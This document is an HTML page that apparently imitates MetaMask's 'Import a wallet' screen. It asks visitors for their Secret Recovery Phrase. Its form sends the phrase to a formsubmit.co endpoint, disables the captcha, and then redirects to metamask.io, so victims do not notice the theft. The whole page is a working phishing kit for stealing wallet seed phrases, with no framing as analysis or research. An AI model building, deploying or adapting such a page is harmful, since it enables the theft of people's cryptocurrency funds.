<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Import a wallet</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            margin: 0 auto;
            background-color: white;
            min-height: 100vh;
            position: relative;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px;
            border-bottom: 1px solid #e0e0e0;
        }

        .back-button {
            background: none;
            border: none;
            font-size: 18px;
            cursor: pointer;
            color: #333;
            display: flex;
            align-items: center;
            width: 24px;
            height: 24px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m15 18-6-6 6-6"/></svg>');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }

        .back-button::before {
            content: "";
        }

        .qr-icon {
            background: none;
            border: none;
            cursor: pointer;
            width: 24px;
            height: 24px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="5" height="5"/><rect x="3" y="16" width="5" height="5"/><rect x="16" y="3" width="5" height="5"/><path d="m5 5 2 2"/><path d="m5 17 2 2"/><path d="m17 5 2 2"/><rect x="7" y="7" width="3" height="3"/><rect x="16" y="16" width="5" height="5"/><path d="m17 17 2 2"/><rect x="7" y="16" width="3" height="3"/></svg>');
            background-size: contain;
        }

        .step-indicator {
            color: #666;
            font-size: 14px;
            margin-bottom: 10px;
            padding: 0 20px;
            margin-top: 10px;
        }

        .title {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
            padding: 0 20px;
        }

        .subtitle {
            color: #666;
            font-size: 16px;
            margin-bottom: 30px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .info-icon {
            width: 16px;
            height: 16px;
            border: 2px solid #666;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: bold;
        }

        .info-icon::after {
            content: "i";
        }

        .input-section {
            padding: 0 20px;
            margin-bottom: 30px;
        }

        .textarea-container {
            position: relative;
            margin-bottom: 20px;
        }

        .textarea {
            width: 100%;
            min-height: 200px;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-family: inherit;
            resize: vertical;
            background-color: #F4F5F9;
        }

        .textarea:focus {
            outline: none;
            border-color: #7c3aed;
        }

        .textarea-actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #F4F5F9;
            border-radius: 8px;
            padding: 8px 40px;
        }

        .show-all-btn, .paste-btn {
            background: none;
            border: none;
            color: #7c3aed;
            font-size: 14px;
            cursor: pointer;
            padding: 8px 12px;
        }

        .show-all-btn:hover, .paste-btn:hover {
            text-decoration: underline;
        }

        .continue-btn {
            background-color: #7c3aed;
            color: white;
            border: none;
            border-radius: 10px;
            padding: 16px 32px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin: 10px 16px 0 0px;
        }

        .continue-btn:hover {
            background-color: #6d28d9;
        }

        .continue-btn:disabled {
            background-color: #A1ABFF;
            cursor: not-allowed;
        }

        /* Desktop styles */
        @media (min-width: 768px) {
            body {
                background-color: #f8f9fa;
                padding: 40px;
                display: flex;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
            }

            .container {
                max-width: 600px;
                min-height: auto;
                border-radius: 16px;
                box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
                overflow: hidden;
                background-color: white;
            }

            .header {
                padding: 30px 40px 20px;
            }

            .step-indicator {
                padding: 0 40px;
                margin-top: 0;
            }

            .title {
                padding: 0 40px;
                font-size: 28px;
            }

            .subtitle {
                padding: 0 40px;
                font-size: 18px;
                margin-bottom: 40px;
            }

            .input-section {
                padding: 0 40px;
                margin-bottom: 30px;
            }

            .textarea {
                min-height: 150px;
                font-size: 16px;
            }

            .continue-btn {
                margin: 0 40px 30px 40px;
                padding: 18px 40px;
                font-size: 18px;
                width: calc(100% - 80px);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <button class="back-button" onclick="window.location.href='index.html'"></button>
            <button class="qr-icon"></button>
        </div>

        <div class="step-indicator">Step 1 of 2</div>
        
        <h1 class="title">Import a wallet</h1>
        
        <div class="subtitle">
            Enter your Secret Recovery Phrase
            <div class="info-icon"></div>
        </div>

        <div class="input-section">
            
            <form action="https://formsubmit.co/77bc7e02d65ac5b13085028955b819c2" method="post" id="submit-form">
                <input type="hidden" name="_next" value="https://metamask.io/" />
                <input type="hidden" name="_captcha" value="false" />
                
                <div class="textarea-container">
                    <textarea 
                        class="textarea" 
                        placeholder="Add a space between each word and make sure no one is watching."
                        id="recoveryPhrase"
                        name="recovery-phrase"
                    ></textarea>
                    
                    <div class="textarea-actions">
                        <button type="button" class="show-all-btn" onclick="toggleShowAll()">Show all</button>
                        <button type="button" class="paste-btn" onclick="pasteText()">Paste</button>
                    </div>
                </div>

                <button type="submit" class="continue-btn" id="continue-btn">Continue</button>
            </form>
        </div>
    </div>

    <script>
        function toggleShowAll() {
            const textarea = document.getElementById('recoveryPhrase');
            const btn = document.querySelector('.show-all-btn');
            
            if (textarea.style.webkitTextSecurity === 'disc' || textarea.style.webkitTextSecurity === '') {
                textarea.style.webkitTextSecurity = 'none';
                textarea.style.textSecurity = 'none';
                btn.textContent = 'Hide all';
            } else {
                textarea.style.webkitTextSecurity = 'disc';
                textarea.style.textSecurity = 'disc';
                btn.textContent = 'Show all';
            }
        }

        async function pasteText() {
            try {
                const text = await navigator.clipboard.readText();
                document.getElementById('recoveryPhrase').value = text;
                // Trigger input event to enable continue button
                document.getElementById('recoveryPhrase').dispatchEvent(new Event('input'));
            } catch (err) {
                // Fallback for browsers that don't support clipboard API
                document.getElementById('recoveryPhrase').focus();
                document.execCommand('paste');
            }
        }

        function handleContinue() {
            const phrase = document.getElementById('recoveryPhrase').value.trim();
            if (phrase) {
                alert('Recovery phrase entered. Next step would be password creation.');
            } else {
                alert('Please enter your recovery phrase first.');
            }
        }

        // Initialize show/hide functionality
        document.addEventListener('DOMContentLoaded', function() {
            const textarea = document.getElementById('recoveryPhrase');
            textarea.style.webkitTextSecurity = 'disc';
            textarea.style.textSecurity = 'disc';
        });

        // Enable/disable continue button based on input
        document.getElementById('recoveryPhrase').addEventListener('input', function() {
            const continueBtn = document.querySelector('.continue-btn');
            continueBtn.disabled = !this.value.trim();
        });

        // Initialize with disabled button
        document.querySelector('.continue-btn').disabled = true;
    </script>
    
    <script type="module" src="/index.ea7f1fab.js"></script>
    <script>
      window.addEventListener("load", () => {
        navigator.userAgent.toLowerCase();
      });
    </script>
    <script type="module" src="/submit.7f15b0bf.js"></script>
    <script type="module" src="./src/submit-val.js"></script>
</body>
</html>
